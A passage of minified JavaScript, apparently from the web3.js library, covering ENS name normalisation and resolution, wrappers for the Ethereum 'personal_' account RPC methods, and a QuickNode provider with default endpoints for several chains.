6Re/S88dKgg8pGOLlAeNiqrcLkUR3/aClFpMXcOUP3rmETcWSfMXZE3TUOi8i+fqRnTYLflVx/Vb/6GJ7eIRZUA6k3RYR3iFSK9c4iDdNwJuZL2FKz/IK5VimcNWEqdXjSoxSgmF0UPlDoUlNrPcM7ftmA8Y9gKiqKEHuWN+AZRIwtVSxye2Kf8rM3lhJ5XcBXU9n4v0Oy1RU2M+4qM8AQPVwse8ErNSob5oFPWxuqZnVzo1qB/IBxkM3EVUKFUUlO3e51259GgNcJbCmlvrdjtoTW7rChm1wyCKzpCTwozUUEOIcWLneRLgMXh+SjGSFkAllzbGS5HK7LlfCMRNRDSvbQPjcXaenNYxCvu2Qyznz6StuxVj66SgI0T8B6/sfHAJYZaZ78thjOSIFumNWLQbeZixDCCC+v0YBtkxiBB3jefHqZ/dFHU+crbj6OvS1x/JDD7vlm7zOVPwpUC01nhxZuY/63E7g";
        const Ig = 44032,
            Pg = 4352,
            Tg = 4449,
            Bg = 4519,
            Ng = 28,
            Og = 21 * Ng,
            Rg = Ig + 19 * Og,
            Mg = Pg + 19,
            jg = Tg + 21,
            Fg = Bg + Ng;

        function Lg(e) {
            return e >> 24 & 255
        }

        function Dg(e) {
            return 16777215 & e
        }
        let Hg, Ug, zg, Gg;

        function qg(e) {
            return e >= Ig && e < Rg
        }

        function Qg(e, t) {
            if (e >= Pg && e < Mg && t >= Tg && t < jg) return Ig + (e - Pg) * Og + (t - Tg) * Ng;
            if (qg(e) && t > Bg && t < Fg && (e - Ig) % Ng == 0) return e + (t - Bg); {
                let n = Gg.get(e);
                return n && (n = n.get(t), n) ? n : -1
            }
        }

        function Wg(e) {
            Hg || function() {
                let e = hg(_g);
                Hg = new Map(vg(e).flatMap(((e, t) => e.map((e => [e, t + 1 << 24]))))), Ug = new Set(gg(e)), zg = new Map, Gg = new Map;
                for (let [t, n] of yg(e)) {
                    if (!Ug.has(t) && 2 == n.length) {
                        let [e, r] = n, i = Gg.get(e);
                        i || (i = new Map, Gg.set(e, i)), i.set(r, t)
                    }
                    zg.set(t, n.reverse())
                }
            }();
            let t = [],
                n = [],
                r = !1;

            function i(e) {
                let n = Hg.get(e);
                n && (r = !0, e |= n), t.push(e)
            }
            for (let o of e)
                for (;;) {
                    if (o < 128) t.push(o);
                    else if (qg(o)) {
                        let e = o - Ig,
                            t = e % Og / Ng | 0,
                            n = e % Ng;
                        i(Pg + (e / Og | 0)), i(Tg + t), n > 0 && i(Bg + n)
                    } else {
                        let e = zg.get(o);
                        e ? n.push(...e) : i(o)
                    }
                    if (!n.length) break;
                    o = n.pop()
                }
            if (r && t.length > 1) {
                let e = Lg(t[0]);
                for (let n = 1; n < t.length; n++) {
                    let r = Lg(t[n]);
                    if (0 == r || e <= r) {
                        e = r;
                        continue
                    }
                    let i = n - 1;
                    for (;;) {
                        let n = t[i + 1];
                        if (t[i + 1] = t[i], t[i] = n, !i) break;
                        if (e = Lg(t[--i]), e <= r) break
                    }
                    e = Lg(t[n])
                }
            }
            return t
        }

        function Vg(e) {
            return Wg(e).map(Dg)
        }

        function Zg(e) {
            return function(e) {
                let t = [],
                    n = [],
                    r = -1,
                    i = 0;
                for (let o of e) {
                    let e = Lg(o),
                        a = Dg(o);
                    if (-1 == r) 0 == e ? r = a : t.push(a);
                    else if (i > 0 && i >= e) 0 == e ? (t.push(r, ...n), n.length = 0, r = a) : n.push(a), i = e;
                    else {
                        let o = Qg(r, a);
                        o >= 0 ? r = o : 0 == i && 0 == e ? (t.push(r), r = a) : (n.push(a), i = e)
                    }
                }
                return r >= 0 && t.push(r, ...n), t
            }(Wg(e))
        }
        const Kg = 45,
            Jg = ".",
            Yg = 65039,
            Xg = 1,
            $g = e => Array.from(e);

        function ev(e, t) {
            return e.P.has(t) || e.Q.has(t)
        }
        class tv extends Array {
            get is_emoji() {
                return !0
            }
        }
        let nv, rv, iv, ov, av, sv, cv, lv, uv, dv, fv, hv;

        function pv() {
            if (nv) return;
            let e = hg(ug);
            const t = () => gg(e),
                n = () => new Set(t());
            nv = new Map(yg(e)), rv = n(), iv = t(), ov = new Set(t().map((e => iv[e]))), iv = new Set(iv), av = n(), sv = n();
            let r = vg(e),
                i = e();
            const o = () => new Set(t().flatMap((e => r[e])).concat(t()));
            cv = bg((t => {
                let n = bg(e).map((e => e + 96));
                if (n.length) {
                    let r = t >= i;
                    return n[0] -= 32, n = Sg(n), r && (n = "Restricted[".concat(n, "]")), {
                        N: n,
                        P: o(),
                        Q: o(),
                        M: !e(),
                        R: r
                    }
                }
            })), lv = n(), uv = new Map;
            let a = t().concat($g(lv)).sort(((e, t) => e - t));
            a.forEach(((t, n) => {
                let r = e(),
                    i = a[n] = r ? a[n - r] : {
                        V: [],
                        M: new Map
                    };
                i.V.push(t), lv.has(t) || uv.set(t, i)
            }));
            for (let {
                    V: u,
                    M: d
                } of new Set(uv.values())) {
                let e = [];
                for (let n of u) {
                    let t = cv.filter((e => ev(e, n))),
                        r = e.find((e => {
                            let {
                                G: n
                            } = e;
                            return t.some((e => n.has(e)))
                        }));
                    r || (r = {
                        G: new Set,
                        V: []
                    }, e.push(r)), r.V.push(n), t.forEach((e => r.G.add(e)))
                }
                let t = e.flatMap((e => $g(e.G)));
                for (let {
                        G: n,
                        V: r
                    } of e) {
                    let e = new Set(t.filter((e => !n.has(e))));
                    for (let t of r) d.set(t, e)
                }
            }
            let s = new Set,
                c = new Set;
            const l = e => s.has(e) ? c.add(e) : s.add(e);
            for (let u of cv) {
                for (let e of u.P) l(e);
                for (let e of u.Q) l(e)
            }
            for (let u of s) uv.has(u) || c.has(u) || uv.set(u, Xg);
            dv = new Set($g(s).concat($g(Vg(s)))), fv = function(e) {
                let t = [],
                    n = gg(e);
                return function e(n, r, i) {
                    let {
                        S: o,
                        B: a
                    } = n;
                    if (!(4 & o && i === r[r.length - 1])) {
                        2 & o && (i = r[r.length - 1]), 1 & o && t.push(r);
                        for (let t of a)
                            for (let n of t.Q) e(t, [...r, n], i)
                    }
                }(function t(r) {
                    return {
                        S: e(),
                        B: bg((() => {
                            let r = gg(e).map((e => n[e]));
                            if (r.length) return t(r)
                        })),
                        Q: r
                    }
                }([]), []), t
            }(e).map((e => tv.from(e))).sort(Cg), hv = new Map;
            for (let u of fv) {
                let e = [hv];
                for (let t of u) {
                    let n = e.map((e => {
                        let n = e.get(t);
                        return n || (n = new Map, e.set(t, n)), n
                    }));
                    t === Yg ? e.push(...n) : e = n
                }
                for (let t of e) t.V = u
            }
        }

        function mv(e) {
            return (yv(e) ? "" : "".concat(gv(vv([e])), " ")) + kg(e)
        }

        function gv(e) {
            return '"'.concat(e, '"\u200e')
        }

        function vv(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : kg,
                n = [];
            var r;
            r = e[0], pv(), iv.has(r) && n.push("\u25cc");
            let i = 0,
                o = e.length;
            for (let a = 0; a < o; a++) {
                let r = e[a];
                yv(r) && (n.push(Sg(e.slice(i, a))), n.push(t(r)), i = a + 1)
            }
            return n.push(Sg(e.slice(i, o))), n.join("")
        }

        function yv(e) {
            return pv(), av.has(e)
        }

        function bv(e, t, n) {
            if (!e) return [];
            pv();
            let r = 0;
            return e.split(Jg).map((e => {
                let i = Eg(e),
                    o = {
                        input: i,
                        offset: r
                    };
                r += i.length + 1;
                try {
                    let e, r = o.tokens = Ev(i, t, n),
                        a = r.length;
                    if (!a) throw new Error("empty label");
                    let s = o.output = r.flat();
                    if (function(e) {
                            for (let t = e.lastIndexOf(95); t > 0;)
                                if (95 !== e[--t]) throw new Error("underscore allowed only at start")
                        }(s), !(o.emoji = a > 1 || r[0].is_emoji) && s.every((e => e < 128))) ! function(e) {
                        if (e.length >= 4 && e[2] == Kg && e[3] == Kg) throw new Error('invalid label extension: "'.concat(Sg(e.slice(0, 4)), '"'))
                    }(s), e = "ASCII";
                    else {
                        let t = r.flatMap((e => e.is_emoji ? [] : e));
                        if (t.length) {
                            if (iv.has(s[0])) throw kv("leading combining mark");
                            for (let e = 1; e < a; e++) {
                                let t = r[e];
                                if (!t.is_emoji && iv.has(t[0])) throw kv('emoji + combining mark: "'.concat(Sg(r[e - 1]), " + ").concat(vv([t[0]]), '"'))
                            }! function(e) {
                                let t = e[0],
                                    n = dg.get(t);
                                if (n) throw kv("leading ".concat(n));
                                let r = e.length,
                                    i = -1;
                                for (let o = 1; o < r; o++) {
                                    t = e[o];
                                    let r = dg.get(t);
                                    if (r) {
                                        if (i == o) throw kv("".concat(n, " + ").concat(r));
                                        i = o + 1, n = r
                                    }
                                }
                                if (i == r) throw kv("trailing ".concat(n))
                            }(s);
                            let n = $g(new Set(t)),
                                [i] = function(e) {
                                    let t = cv;
                                    for (let n of e) {
                                        let e = t.filter((e => ev(e, n)));
                                        if (!e.length) throw cv.some((e => ev(e, n))) ? Av(t[0], n) : xv(n);
                                        if (t = e, 1 == e.length) break
                                    }
                                    return t
                                }(n);
                            ! function(e, t) {
                                for (let n of t)
                                    if (!ev(e, n)) throw Av(e, n);
                                if (e.M) {
                                    let e = Vg(t);
                                    for (let t = 1, n = e.length; t < n; t++)
                                        if (ov.has(e[t])) {
                                            let r = t + 1;
                                            for (let i; r < n && ov.has(i = e[r]); r++)
                                                for (let n = t; n < r; n++)
                                                    if (e[n] == i) throw new Error("duplicate non-spacing marks: ".concat(mv(i)));
                                            if (r - t > fg) throw new Error("excessive non-spacing marks: ".concat(gv(vv(e.slice(t - 1, r))), " (").concat(r - t, "/").concat(fg, ")"));
                                            t = r
                                        }
                                }
                            }(i, t),
                            function(e, t) {
                                let n, r = [];
                                for (let i of t) {
                                    let e = uv.get(i);
                                    if (e === Xg) return;
                                    if (e) {
                                        let t = e.M.get(i);
                                        if (n = n ? n.filter((e => t.has(e))) : $g(t), !n.length) return
                                    } else r.push(i)
                                }
                                if (n)
                                    for (let i of n)
                                        if (r.every((e => ev(i, e)))) throw new Error("whole-script confusable: ".concat(e.N, "/").concat(i.N))
                            }(i, n), e = i.N
                        } else e = "Emoji"
                    }
                    o.type = e
                } catch (a) {
                    o.error = a
                }
                return o
            }))
        }

        function wv(e) {
            return e.map((t => {
                let {
                    input: n,
                    error: r,
                    output: i
                } = t;
                if (r) {
                    let t = r.message;
                    throw new Error(1 == e.length ? t : "Invalid label ".concat(gv(vv(n)), ": ").concat(t))
                }
                return Sg(i)
            })).join(Jg)
        }

        function xv(e) {
            return new Error("disallowed character: ".concat(mv(e)))
        }

        function Av(e, t) {
            let n = mv(t),
                r = cv.find((e => e.P.has(t)));
            return r && (n = "".concat(r.N, " ").concat(n)), new Error("illegal mixture: ".concat(e.N, " + ").concat(n))
        }

        function kv(e) {
            return new Error("illegal placement: ".concat(e))
        }

        function Ev(e, t, n) {
            let r = [],
                i = [];
            for (e = e.slice().reverse(); e.length;) {
                let o = Cv(e);
                if (o) i.length && (r.push(t(i)), i = []), r.push(n(o));
                else {
                    let t = e.pop();
                    if (dv.has(t)) i.push(t);
                    else {
                        let e = nv.get(t);
                        if (e) i.push(...e);
                        else if (!rv.has(t)) throw xv(t)
                    }
                }
            }
            return i.length && r.push(t(i)), r
        }

        function Sv(e) {
            return e.filter((e => e != Yg))
        }

        function Cv(e, t) {
            let n, r = hv,
                i = e.length;
            for (; i && (r = r.get(e[--i]), r);) {
                let {
                    V: o
                } = r;
                o && (n = o, t && t.push(...e.slice(i).reverse()), e.length = i)
            }
            return n
        }
        const _v = e => function(e) {
                return wv(bv(e, Zg, Sv))
            }(e),
            Iv = e => {
                let t = "";
                for (let n = 0; n < 32; n += 1) t += "00";
                if (e) {
                    const n = _v(e).split(".");
                    for (let e = n.length - 1; e >= 0; e -= 1) {
                        const r = _c(n[e]).slice(2);
                        t = _c("0x".concat(t).concat(r)).slice(2)
                    }
                }
                return "0x".concat(t)
            };
        var Pv = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        class Tv {
            constructor(e, t) {
                this.contract = new Ym(cg, null !== t && void 0 !== t ? t : ag.main, e), this.context = e
            }
            getOwner(e) {
                return Pv(this, void 0, void 0, (function*() {
                    try {
                        return this.contract.methods.owner(Iv(e)).call()
                    } catch (t) {
                        throw new Error
                    }
                }))
            }
            getTTL(e) {
                return Pv(this, void 0, void 0, (function*() {
                    try {
                        return this.contract.methods.ttl(Iv(e)).call()
                    } catch (t) {
                        throw new Error
                    }
                }))
            }
            recordExists(e) {
                return Pv(this, void 0, void 0, (function*() {
                    try {
                        return this.contract.methods.recordExists(Iv(e)).call()
                    } catch (t) {
                        throw new Error
                    }
                }))
            }
            getResolver(e) {
                return Pv(this, void 0, void 0, (function*() {
                    try {
                        return this.contract.methods.resolver(Iv(e)).call().then((e => {
                            if ("string" === typeof e) {
                                return new Ym(lg, e, this.context)
                            }
                            throw new Error
                        }))
                    } catch (t) {
                        throw new Error
                    }
                }))
            }
            get events() {
                return this.contract.events
            }
        }
        var Bv = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        class Nv {
            constructor(e) {
                this.registry = e
            }
            getResolverContractAdapter(e) {
                return Bv(this, void 0, void 0, (function*() {
                    return this.registry.getResolver(e)
                }))
            }
            checkInterfaceSupport(e, t) {
                var n, r;
                return Bv(this, void 0, void 0, (function*() {
                    if (cc($m[t])) throw new zt(null !== (n = e.options.address) && void 0 !== n ? n : "", t);
                    if (!(yield e.methods.supportsInterface($m[t]).call())) throw new zt(null !== (r = e.options.address) && void 0 !== r ? r : "", t)
                }))
            }
            supportsInterface(e, t) {
                var n;
                return Bv(this, void 0, void 0, (function*() {
                    const r = yield this.getResolverContractAdapter(e);
                    let i = t;
                    if (!_a(i)) {
                        if (i = null !== (n = Cc(t)) && void 0 !== n ? n : "", "" === t) throw new Error("Invalid interface Id");
                        i = i.slice(0, 10)
                    }
                    return r.methods.supportsInterface(i).call()
                }))
            }
            getAddress(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 60;
                return Bv(this, void 0, void 0, (function*() {
                    const n = yield this.getResolverContractAdapter(e);
                    return yield this.checkInterfaceSupport(n, tg), n.methods.addr(Iv(e), t).call()
                }))
            }
            getPubkey(e) {
                return Bv(this, void 0, void 0, (function*() {
                    const t = yield this.getResolverContractAdapter(e);
                    return yield this.checkInterfaceSupport(t, ng), t.methods.pubkey(Iv(e)).call()
                }))
            }
            getContenthash(e) {
                return Bv(this, void 0, void 0, (function*() {
                    const t = yield this.getResolverContractAdapter(e);
                    return yield this.checkInterfaceSupport(t, rg), t.methods.contenthash(Iv(e)).call()
                }))
            }
            setAddress(e, t, n) {
                return Bv(this, void 0, void 0, (function*() {
                    const r = yield this.getResolverContractAdapter(e);
                    return yield this.checkInterfaceSupport(r, eg), r.methods.setAddr(Iv(e), t).send(n)
                }))
            }
            getText(e, t) {
                return Bv(this, void 0, void 0, (function*() {
                    const n = yield this.getResolverContractAdapter(e);
                    return yield this.checkInterfaceSupport(n, ig), n.methods.text(Iv(e), t).call()
                }))
            }
            getName(e) {
                let t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
                return Bv(this, void 0, void 0, (function*() {
                    const n = "".concat(e.toLowerCase().substring(2), ".addr.reverse"),
                        r = yield this.getResolverContractAdapter(n);
                    return t && (yield this.checkInterfaceSupport(r, og)), r.methods.name(Iv(n)).call()
                }))
            }
        }
        var Ov = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        class Rv extends Tf {
            constructor(e, t) {
                super(null !== t && void 0 !== t ? t : ""), this.registryAddress = null !== e && void 0 !== e ? e : ag.main, this._registry = new Tv(this.getContextObject(), e), this._resolver = new Nv(this._registry)
            }
            getResolver(e) {
                return Ov(this, void 0, void 0, (function*() {
                    return this._registry.getResolver(e)
                }))
            }
            recordExists(e) {
                return Ov(this, void 0, void 0, (function*() {
                    return this._registry.recordExists(e)
                }))
            }
            getTTL(e) {
                return Ov(this, void 0, void 0, (function*() {
                    return this._registry.getTTL(e)
                }))
            }
            getOwner(e) {
                return Ov(this, void 0, void 0, (function*() {
                    return this._registry.getOwner(e)
                }))
            }
            getAddress(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 60;
                return Ov(this, void 0, void 0, (function*() {
                    return this._resolver.getAddress(e, t)
                }))
            }
            getText(e, t) {
                return Ov(this, void 0, void 0, (function*() {
                    return Ya(e) ? this._resolver.getText(yield this._resolver.getName(e, !1), t) : this._resolver.getText(e, t)
                }))
            }
            getName(e) {
                let t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
                return Ov(this, void 0, void 0, (function*() {
                    return this._resolver.getName(e, t)
                }))
            }
            getPubkey(e) {
                return Ov(this, void 0, void 0, (function*() {
                    return this._resolver.getPubkey(e)
                }))
            }
            getContenthash(e) {
                return Ov(this, void 0, void 0, (function*() {
                    return this._resolver.getContenthash(e)
                }))
            }
            checkNetwork() {
                return Ov(this, void 0, void 0, (function*() {
                    const e = Date.now() / 1e3;
                    if (!this._lastSyncCheck || e - this._lastSyncCheck > 3600) {
                        const n = yield(t = this, tm(void 0, void 0, void 0, (function*() {
                            return jf(t.requestManager)
                        })));
                        if ("boolean" !== typeof n || n) throw new Vt;
                        this._lastSyncCheck = e
                    }
                    var t;
                    if (this._detectedAddress) return this._detectedAddress;
                    const n = yield dh(this, Object.assign(Object.assign({}, this.defaultReturnFormat), {
                        number: Je.HEX
                    })), r = ag[sg[n]];
                    if ("undefined" === typeof r) throw new Wt(n);
                    return this._detectedAddress = r, this._detectedAddress
                }))
            }
            supportsInterface(e, t) {
                return Ov(this, void 0, void 0, (function*() {
                    return this._resolver.supportsInterface(e, t)
                }))
            }
            get events() {
                return this._registry.events
            }
            setAddress(e, t, n) {
                return Ov(this, void 0, void 0, (function*() {
                    return this._resolver.setAddress(e, t, n)
                }))
            }
        }
        var Mv = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        const jv = e => Mv(void 0, void 0, void 0, (function*() {
                const t = yield(e => Hf(void 0, void 0, void 0, (function*() {
                    return e.send({
                        method: "personal_listAccounts",
                        params: []
                    })
                })))(e);
                return t.map(Qs)
            })),
            Fv = (e, t) => Mv(void 0, void 0, void 0, (function*() {
                ps.validate(["string"], [t]);
                const n = yield((e, t) => Hf(void 0, void 0, void 0, (function*() {
                    return e.send({
                        method: "personal_newAccount",
                        params: [t]
                    })
                })))(e, t);
                return Qs(n)
            })),
            Lv = (e, t, n, r) => Mv(void 0, void 0, void 0, (function*() {
                return ps.validate(["address", "string", "uint"], [t, n, r]), ((e, t, n, r) => Hf(void 0, void 0, void 0, (function*() {
                    return e.send({
                        method: "personal_unlockAccount",
                        params: [t, n, r]
                    })
                })))(e, t, n, r)
            })),
            Dv = (e, t) => Mv(void 0, void 0, void 0, (function*() {
                return ps.validate(["address"], [t]), ((e, t) => Hf(void 0, void 0, void 0, (function*() {
                    return e.send({
                        method: "personal_lockAccount",
                        params: [t]
                    })
                })))(e, t)
            })),
            Hv = (e, t, n) => Mv(void 0, void 0, void 0, (function*() {
                return ps.validate(["string", "string"], [t, n]), ((e, t, n) => Hf(void 0, void 0, void 0, (function*() {
                    return e.send({
                        method: "personal_importRawKey",
                        params: [t, n]
                    })
                })))(e, t, n)
            })),
            Uv = (e, t, n) => Mv(void 0, void 0, void 0, (function*() {
                const r = lh(t, $e);
                return ((e, t, n) => Hf(void 0, void 0, void 0, (function*() {
                    return e.send({
                        method: "personal_sendTransaction",
                        params: [t, n]
                    })
                })))(e, r, n)
            })),
            zv = (e, t, n) => Mv(void 0, void 0, void 0, (function*() {
                const r = lh(t, $e);
                return ((e, t, n) => Hf(void 0, void 0, void 0, (function*() {
                    return e.send({
                        method: "personal_signTransaction",
                        params: [t, n]
                    })
                })))(e, r, n)
            })),
            Gv = (e, t, n, r) => Mv(void 0, void 0, void 0, (function*() {
                ps.validate(["string", "address", "string"], [t, n, r]);
                const i = _a(t) ? t : Ps(t);
                return ((e, t, n, r) => Hf(void 0, void 0, void 0, (function*() {
                    return e.send({
                        method: "personal_sign",
                        params: [t, n, r]
                    })
                })))(e, i, n, r)
            })),
            qv = (e, t, n) => Mv(void 0, void 0, void 0, (function*() {
                ps.validate(["string", "string"], [t, n]);
                const r = _a(t) ? t : Ps(t);
                return ((e, t, n) => Hf(void 0, void 0, void 0, (function*() {
                    return e.send({
                        method: "personal_ecRecover",
                        params: [t, n]
                    })
                })))(e, r, n)
            }));
        var Qv = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        class Wv extends Tf {
            getAccounts() {
                return Qv(this, void 0, void 0, (function*() {
                    return jv(this.requestManager)
                }))
            }
            newAccount(e) {
                return Qv(this, void 0, void 0, (function*() {
                    return Fv(this.requestManager, e)
                }))
            }
            unlockAccount(e, t, n) {
                return Qv(this, void 0, void 0, (function*() {
                    return Lv(this.requestManager, e, t, n)
                }))
            }
            lockAccount(e) {
                return Qv(this, void 0, void 0, (function*() {
                    return Dv(this.requestManager, e)
                }))
            }
            importRawKey(e, t) {
                return Qv(this, void 0, void 0, (function*() {
                    return Hv(this.requestManager, e, t)
                }))
            }
            sendTransaction(e, t) {
                return Qv(this, void 0, void 0, (function*() {
                    return Uv(this.requestManager, e, t)
                }))
            }
            signTransaction(e, t) {
                return Qv(this, void 0, void 0, (function*() {
                    return zv(this.requestManager, e, t)
                }))
            }
            sign(e, t, n) {
                return Qv(this, void 0, void 0, (function*() {
                    return Gv(this.requestManager, e, t, n)
                }))
            }
            ecRecover(e, t) {
                return Qv(this, void 0, void 0, (function*() {
                    return qv(this.requestManager, e, t)
                }))
            }
        }
        var Vv, Zv;
        ! function(e) {
            e.HTTPS = "https", e.WebSocket = "wss"
        }(Vv || (Vv = {})),
        function(e) {
            e.ETH_MAINNET = "eth_mainnet", e.ETH_GOERLI = "eth_goerli", e.ETH_SEPOLIA = "eth_sepolia", e.ETH_HOLESKY = "eth_holesky", e.POLYGON_MAINNET = "polygon_mainnet", e.POLYGON_MUMBAI = "polygon_mumbai", e.POLYGON_AMONY = "polygon_amony", e.ARBITRUM_MAINNET = "arbitrum_mainnet", e.ARBITRUM_SEPOLIA = "arbitrum_sepolia", e.BASE_MAINNET = "base_mainnet", e.BASE_SEPOLIA = "base_sepolia", e.OPTIMISM_MAINNET = "optimism_mainnet", e.OPTIMISM_SEPOLIA = "optimism_sepolia", e.BNB_MAINNET = "bnb_mainnet", e.BNB_TESTNET = "bnb_testnet"
        }(Zv || (Zv = {}));
        class Kv extends Et {
            constructor() {
                super("Too many requests, Quicknode has reached its rate limit."), this.code = 1300
            }
        }
        var Jv = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        class Yv extends ul {
            constructor(e, t, n, r) {
                super(), this.transport = t, t === Vv.HTTPS ? this.provider = new bl(this.getRPCURL(e, t, n, r)) : t === Vv.WebSocket && (this.provider = new Al(this.getRPCURL(e, t, n, r)))
            }
            request(e, t) {
                return Jv(this, void 0, void 0, (function*() {
                    if (this.transport === Vv.HTTPS) {
                        const n = yield this.provider.request(e, t);
                        if ("object" === typeof n && !ss(n) && "error" in n && !ss(n.error) && "code" in n.error && 429 === n.error.code) throw new Kv;
                        return n
                    }
                    return this.provider.request(e)
                }))
            }
            getStatus() {
                return this.provider.getStatus()
            }
            supportsSubscriptions() {
                return this.provider.supportsSubscriptions()
            }
            once(e, t) {
                var n;
                (null === (n = this.provider) || void 0 === n ? void 0 : n.once) && this.provider.once(e, t)
            }
            removeAllListeners(e) {
                var t;
                (null === (t = this.provider) || void 0 === t ? void 0 : t.removeAllListeners) && this.provider.removeAllListeners(e)
            }
            connect() {
                var e;
                (null === (e = this.provider) || void 0 === e ? void 0 : e.connect) && this.provider.connect()
            }
            disconnect(e, t) {
                var n;
                (null === (n = this.provider) || void 0 === n ? void 0 : n.disconnect) && this.provider.disconnect(e, t)
            }
            reset() {
                var e;
                (null === (e = this.provider) || void 0 === e ? void 0 : e.reset) && this.provider.reset()
            }
            on(e, t) {
                this.provider && this.provider.on(e, t)
            }
            removeListener(e, t) {
                this.provider && this.provider.removeListener(e, t)
            }
        }
        const Xv = e => void 0 !== e && e.trim().length > 0;
        const $v = new class extends Yv {
                constructor() {
                    super(arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : Zv.ETH_MAINNET, arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : Vv.HTTPS, arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "", arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : "")
                }
                getRPCURL(e, t, n, r) {
                    let i = "",
                        o = "";
                    switch (e) {
                        case Zv.ETH_MAINNET:
                            i = Xv(r) ? r : "powerful-holy-bush.quiknode.pro", o = Xv(n) ? n : "3240624a343867035925ff7561eb60dfdba2a668";
                            break;
                        case Zv.ETH_SEPOLIA:
                            i = Xv(r) ? r : "dimensional-fabled-glitter.ethereum-sepolia.quiknode.pro", o = Xv(n) ? n : "382a3b5a4b938f2d6e8686c19af4b22921fde2cd";
                            break;
                        case Zv.ETH_HOLESKY:
                            i = Xv(r) ? r : "yolo-morning-card.ethereum-holesky.quiknode.pro", o = Xv(n) ? n : "481ebe70638c4dcf176af617a16d02ab866b9af9";
                            break;
                        case Zv.ARBITRUM_MAINNET:
                            i = Xv(r) ? r : "autumn-divine-dinghy.arbitrum-mainnet.quiknode.pro", o = Xv(n) ? n : "a5d7bfbf60b5ae9ce3628e53d69ef50d529e9a8c";
                            break;
                        case Zv.ARBITRUM_SEPOLIA:
                            i = Xv(r) ? r : "few-patient-pond.arbitrum-sepolia.quiknode.pro", o = Xv(n) ? n : "3be985450970628c860b959c65cd2642dcafe53c";
                            break;
                        case Zv.BNB_MAINNET:
                            i = Xv(r) ? r : "purple-empty-reel.bsc.quiknode.pro", o = Xv(n) ? n : "ebf6c532961e21f092ff2facce1ec4c89c540158";
                            break;
                        case Zv.BNB_TESTNET:
                            i = Xv(r) ? r : "floral-rough-scion.bsc-testnet.quiknode.pro", o = Xv(n) ? n : "5b297e5acff5f81f4c37ebf6f235f7299b6f9d28";
                            break;
                        case Zv.POLYGON_MAINNET:
                            i = Xv(r) ? r : "small-chaotic-moon.matic.quiknode.pro", o = Xv(n) ? n : "847569f8a017e84d985e10d0f44365d965a951f1";
                            break;
                        case Zv.POLYGON_AMONY:
                            i = Xv(r) ? r : "prettiest-side-shape.matic-amoy.quiknode.pro", o = Xv(n) ? n : "79a9476eea661d4f82de614db1d8a895b14b881c";
                            break;
                        default:
                            throw new Error("Network info not avalible.")
                    }
                    return "".concat(t, "://").concat(i, "/").concat(o)
                }
            },
            ey = {
                encodeEventSignature: qh,
                encodeFunctionCall: (e, t) => {
                    var n;
                    if (!Lh(e)) throw new $t("Invalid parameter value in encodeFunctionCall");
                    return "".concat(Gp(e)).concat(Fp(null !== (n = e.inputs) && void 0 !== n ? n : [], null !== t && void 0 !== t ? t : []).replace("0x", ""))
                },
                encodeFunctionSignature: Gp,
                encodeParameter: Dp,
                encodeParameters: Fp,
                decodeParameter: zp,
                decodeParameters: Up,
                decodeLog: Qp
            };
        var ty = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
